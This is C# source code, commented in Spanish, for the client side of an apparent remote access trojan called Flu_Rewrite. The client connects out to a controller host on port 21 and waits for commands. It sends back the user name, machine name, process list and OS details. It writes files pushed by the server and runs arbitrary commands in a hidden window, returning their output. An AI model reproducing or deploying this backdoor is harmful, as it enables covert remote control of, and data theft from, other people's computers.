using System;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Text;
using System.Security.Principal;
using System.Diagnostics;
using System.Reflection;
using System.Collections.Generic;

namespace Flu_Rewrite
{
    //TODO: Exigir encriptacion
    //TODO: Cambiar a UDPServer
    class ClienteSockets
    {

        //Es la magia que nos permite comunicarnos con el servidor :)
        private TcpClient Cliente;
        //Este delegado se ejecutaria cada vez que recibamos un comando del servidor
        //TODO: Esto deberia ser un evento que expong aun tipo con la informacion del comando
        // y una variable para cancelar su ejecucin si un plugin asi lo desea [WPF Style]
        public delegate Boolean ComandoRecibido(Boolean Interno, String Comando, String Parametros);

        //En un futuro se implementara UPnP para poder aleatorizar el puerto :D
        //Por ahora el puerto de FTP es una buena opcion, aunque discutible
        //TODO: Implementar un sistema de Logs
        public ClienteSockets(String Host)
        { Cliente = new TcpClient(Host, 21); /**Thread Loop = new Thread(new ThreadStart(LoopPrincipal)); Loop.Start();*/ LoopPrincipal(); }

        public void LoopPrincipal()
        {
            Byte[] Buffer = new Byte[2048];
            while (true)
            {
                Cliente.Client.Receive(Buffer);
                String Comando = Encoding.ASCII.GetString(Buffer);
                switch (Comando)
                {
                    case "Usuario":
                        Cliente.Client.Send(Encoding.ASCII.GetBytes(WindowsIdentity.GetCurrent().Name.Split(' ')[1]));
                        break;
                    case "Maquina":
                        Cliente.Client.Send(Encoding.ASCII.GetBytes(WindowsIdentity.GetCurrent().Name.Split(' ')[0]));
                        break;
                    case "Procesos":
                        Cliente.Client.Send(Encoding.ASCII.GetBytes(ObtenerProcesos()));
                        break;
                    case "SO":
                        Cliente.Client.Send(Encoding.ASCII.GetBytes(Environment.OSVersion.Platform.ToString()));
                        break;
                    case "Funciones":
                        Cliente.Client.Send(Encoding.ASCII.GetBytes(ObtenerFunciones()));
                        break;
                    case "Archivo":
                        try { RecibirArchivo(); Cliente.Client.Send(Encoding.ASCII.GetBytes("OK")); }
                        catch (Exception ex) { Cliente.Client.Send(Encoding.ASCII.GetBytes("Error" + ex.Message)); }
                        break;
                    case "Comando Interno":
                        EjecutarComandoInterno();
                        break;
                    case "Comando Externo":
                        EjecutarComando();
                        break;
                }
                Buffer = new Byte[2048];
            }
        }

        public String ObtenerProcesos()
        {
            String Retorno = "";
            Process[] Procesos = Process.GetProcesses();
            foreach (Process P in Procesos) Retorno += P.ProcessName + " ?";
            return Retorno;
        }

        //Esto es mejor no escribirlo explicitamente para no tener que modificar 
        //el servidor cada vez que se implemente una funcion nueva
        public String ObtenerFunciones()
        {
            //Reflexion... http://msdn.microsoft.com/es-es/library/ms173183%28v=VS.100%29.aspx
            String Retorno = "";
            Type Comandos = typeof(ComandosInternos);
            MethodInfo[] Metodos = Comandos.GetMethods();
            foreach (MethodInfo Metodo in Metodos) Retorno += Metodo.Name + " ||";
            return Retorno;
        }

        public void RecibirArchivo()
        {
            Byte[] Nombre = new Byte[2048];
            Byte[] Archivo = new Byte[2048];
            Cliente.Client.Receive(Nombre);
            Cliente.Client.Receive(Archivo);
            File.WriteAllBytes(Encoding.ASCII.GetString(Nombre), Archivo);
        }

        public void EjecutarComando()
        {
            try
            {
                Byte[] Comando = new Byte[2048];
                Byte[] Argumentos = new Byte[2048];
                Cliente.Client.Receive(Comando);
                Cliente.Client.Receive(Argumentos);
                //No necesitamos mas argumentos. Esto deberia ser el trabajo del plugin en el servidor
                Cliente.Client.Send(Encoding.ASCII.GetBytes("Interrumpir"));
                String SComando = Encoding.ASCII.GetString(Comando);
                String SArgumentos = Encoding.ASCII.GetString(Argumentos);
                ProcessStartInfo PSI = new ProcessStartInfo(SComando, SArgumentos);
                //No queremos que se inicie ninguna ventana, aunque en una proxima version se hara configurable
                PSI.CreateNoWindow = true;
                //Si falla no haga nada
                PSI.ErrorDialog = false;
                //NEcesitamos devolver lo que devuelva el programa
                PSI.RedirectStandardOutput = true;
                //???
                PSI.UseShellExecute = false;
                //Iniciar el proceso
                Process Proceso = Process.Start(PSI);
                //Obtener su salida estandar
                StreamReader Salida = Proceso.StandardOutput;
                String Resultado = Salida.ReadToEnd();
                //Es necesario liberar este Stream, aunque tambien podria hacerlo el Garbahe Collector :p
                Salida.Close();
                //Enviamos lo que salga del comando al servidor
                Cliente.Client.Send(Encoding.ASCII.GetBytes(Resultado));
            }
            catch (Exception e) { Cliente.Client.Send(Encoding.ASCII.GetBytes("ERROR: " + e.Message)); }
        }

        public void EjecutarComandoInterno()
        {
            try
            {
                //Buffers
                Byte[] BufferFuncion = new Byte[2048];
                Byte[] BufferArgumentos = new Byte[2048];
                //Recibir el nombre del metodo
                Cliente.Client.Receive(BufferFuncion);
                //Decodificarlo
                String SFuncion = Encoding.ASCII.GetString(BufferFuncion);
                //Buscar el metodo
                Type Comandos = typeof(ComandosInternos);
                MethodInfo Metodo = Comandos.GetMethod(SFuncion);
                //Alertar al servidor si el metodo fue encontrado
                if (Metodo != null) Cliente.Client.Send(Encoding.ASCII.GetBytes("Encontrada"));
                else { Cliente.Client.Send(Encoding.ASCII.GetBytes("No encontrada")); return; }
                //Una lsta de los parametros que envia el servidor
                List<String> Parametros = new List<String>();
                Cliente.Client.Receive(BufferArgumentos);
                String Buffer = Encoding.ASCII.GetString(BufferArgumentos);
                //Mientras hayan parametros, añadirlos...
                while (Buffer != "Fin Comando")
                {
                    Parametros.Add(Buffer);
                    BufferArgumentos.Limpiar();
                    Cliente.Client.Receive(BufferArgumentos);
                    Buffer = Encoding.ASCII.GetString(BufferArgumentos);
                }
                Object Retorno = Metodo.Invoke(null, new object[1] { Parametros.ToArray() as object[] });
                Cliente.Client.Send(Encoding.ASCII.GetBytes(Retorno.ToString()));
            }
            catch { return; }
        }
    }
}
